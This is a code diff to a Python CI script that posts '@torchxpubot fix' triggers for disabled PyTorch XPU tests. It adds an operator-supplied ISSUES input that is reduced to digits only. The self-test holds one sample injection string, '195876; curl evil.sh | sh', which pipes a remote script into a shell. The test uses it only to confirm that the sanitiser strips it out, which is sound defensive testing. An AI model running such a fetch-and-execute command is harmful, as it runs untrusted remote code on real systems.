@@ -5,9 +5,17 @@
 """Queue upstream DISABLED-test batches onto the tracking issue as `@torchxpubot fix`.
 
 Usage:
-    GH_TOKEN=<read on SOURCE_REPO, write on TARGET_REPO> \
-        python ci_disabled_queue.py [--dry-run]
+    GH_TOKEN=<read on SOURCE_REPO, write on TARGET_REPO> [DRY_RUN=1] \
+        python ci_disabled_queue.py                  # discover the next batch
+    GH_TOKEN=<...> ISSUES="195876 196392" [DRY_RUN=1] \
+        python ci_disabled_queue.py                  # queue exactly these
     python ci_disabled_queue.py --self-test
+
+`ISSUES` skips discovery entirely: no SOURCE read, no dedup, just the trigger the
+operator asked for. It is the only mode that works while SOURCE is a private repo
+owned by a personal account -- MERGE_TOKEN is a fine-grained PAT, which cannot
+reach those (verified: 404 from the token-access job, with torchxpubot already a
+collaborator). Discovery comes back when SOURCE moves into this repo.
 
 The XPU CI report issue (SOURCE) grows a comment per failing `xpu.yml` commit.
 The ones that matter here carry a `Disable issues:` list of `pytorch/pytorch`
@@ -181,6 +189,21 @@ def trigger_body(comment, issues):
     )
 
 
+def explicit_body(issues):
+    """Trigger for an operator-supplied list, with no SOURCE batch behind it."""
+    return "\n".join(
+        [
+            "@torchxpubot fix",
+            "",
+            "These tests are DISABLED upstream and still blocking XPU CI.",
+            "",
+            "Disable issues:",
+            *(f"- https://github.com/pytorch/pytorch/issues/{n}" for n in issues),
+            "",
+        ]
+    )
+
+
 def self_test():
     rerun = (
         "Commit [`abc`](https://hud.pytorch.org/pytorch/pytorch/commit/abc) - run\n"
@@ -228,6 +251,14 @@ def self_test():
     assert pending(dict(new, body=batch), mirrored) == ["197334"], (
         "re-reported after a reopen is queued again; still-open is deduped"
     )
+
+    # ISSUES is a workflow_dispatch input, so only its digits are trusted.
+    hostile = "195876; curl evil.sh | sh #196392"
+    assert re.findall(r"\d+", hostile) == ["195876", "196392"]
+    explicit = explicit_body(re.findall(r"\d+", hostile))
+    assert explicit.startswith("@torchxpubot fix\n"), "command on the first line"
+    assert "curl" not in explicit and "evil" not in explicit, "nothing else survives"
+    assert disabled_issues(explicit) == ["195876", "196392"]
     print("self-test ok")
 
 
@@ -240,15 +271,20 @@ def main():
         print(f"a fix job is still running ({busy}); nothing queued this round")
         return
 
-    mirrored = last_mirrored()
-    comment, issues = next_batch(mirrored)
-    if not comment:
-        print(f"nothing to queue since {START}; {len(mirrored)} issues mirrored so far")
-        return
+    # Digits only: this arrives from a workflow_dispatch input.
+    issues = re.findall(r"\d+", os.environ.get("ISSUES", ""))
+    if issues:
+        body = explicit_body(issues)
+    else:
+        mirrored = last_mirrored()
+        comment, issues = next_batch(mirrored)
+        if not comment:
+            print(f"nothing to queue since {START}; {len(mirrored)} mirrored so far")
+            return
+        body = trigger_body(comment, issues)
 
-    body = trigger_body(comment, issues)
-    if "--dry-run" in sys.argv:
-        print(body)
+    if os.environ.get("DRY_RUN", "").lower() not in ("", "false", "0"):
+        print(f"[dry run]\n\n{body}")
         return
 
     posted = api(f"/repos/{TARGET_REPO}/issues/{TARGET_ISSUE}/comments", {"body": body})
